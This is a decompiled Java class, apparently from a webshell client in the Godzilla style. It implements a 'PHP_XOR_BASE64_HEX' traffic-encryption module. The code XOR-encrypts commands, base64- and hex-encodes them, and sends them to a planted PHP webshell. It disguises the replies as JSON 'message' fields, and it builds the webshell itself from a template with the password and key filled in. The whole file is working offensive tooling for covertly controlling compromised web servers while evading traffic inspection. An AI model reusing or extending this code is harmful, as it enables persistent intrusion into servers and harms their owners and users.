//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.cryptions.phpXor;

import core.annotation.CryptionAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;
import util.Log;
import util.functions;
import util.http.Http;
import java.lang.String;

import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;

//@CryptionAnnotation(
//        Name = "PHP_XOR_BASE64_HEX",
//        payloadName = "PhpDynamicPayload"
//)
public abstract class PhpXorhex implements Cryption {
    private ShellEntity shell;
    private Http http;
    private byte[] key;
    private boolean state;
    private String pass;
    private byte[] payload;
    private String findStrLeft;
    private String findStrRight;

    public PhpXorhex() {
    }

    public void init(ShellEntity context) {
        this.shell = context;
        this.http = this.shell.getHttp();
        this.key = this.shell.getSecretKeyX().getBytes();
        this.pass = this.shell.getPassword();
        String findStrMd5 = functions.md5(this.pass + new String(this.key));
        //this.findStrLeft = findStrMd5.substring(0, 16);
        //this.findStrRight = findStrMd5.substring(16);
        this.findStrLeft = "{\"message\":\"";
        this.findStrRight = "\"}";

        try {
            this.payload = this.shell.getPayloadModule().getPayload();
            if (this.payload != null) {
                this.http.sendHttpResponse(this.payload);
                this.state = true;
            } else {
                Log.error("payload Is Null");
            }

        } catch (Exception var4) {
            Exception e = var4;
            Log.error(e);
        }
    }

    public byte[] encode(byte[] data) {
        try {
            return this.E(data);
        } catch (Exception var3) {
            Exception e = var3;
            Log.error(e);
            return null;
        }
    }

    public byte[] decode(byte[] data) {
        if (data != null && data.length > 0) {
            try {
                return this.D(this.findStr(data));
            } catch (Exception var3) {
                Exception e = var3;
                Log.error(e);
                return null;
            }
        } else {
            return data;
        }
    }

    public boolean isSendRLData() {
        return true;
    }

    public byte[] E(byte[] cs) {
        int len = cs.length;

        for(int i = 0; i < len; ++i) {
            cs[i] ^= this.key[i + 1 & 15];
        }


        String Str1 = functions.base64EncodeToString(cs);
//        //return (this.pass + "=" + URLEncoder.encode(functions.base64EncodeToString(cs))).getBytes();
//        System.out.println(Str1);

        StringBuilder hexString = new StringBuilder();
        byte[] bytes = Str1.getBytes(StandardCharsets.UTF_8);
        for (byte b : bytes) {
            hexString.append(String.format("%02X", b)); // 转换为Hex并拼接
        }

       // System.out.println("Hex Output: " + hexString.toString());

        return (this.pass + "=" + hexString).getBytes();

    }


    public byte[] D(String data) {
        byte[] cs = functions.base64Decode(data);
        int len = cs.length;

        for(int i = 0; i < len; ++i) {
            cs[i] ^= this.key[i + 1 & 15];
        }

        return cs;
    }

    public String findStr(byte[] respResult) {
        String htmlString = new String(respResult);
        return functions.subMiddleStr(htmlString, this.findStrLeft, this.findStrRight);
    }

    public boolean check() {
        return this.state;
    }

    public byte[] generate(String password, String secretKey) {
        return (new String(functions.readInputStreamAutoClose(PhpXorhex.class.getResourceAsStream("template/xorbase64message.bin")))).replace("{pass}", password).replace("{secretKey}", functions.md5(secretKey).substring(0, 16)).getBytes();
    }
}
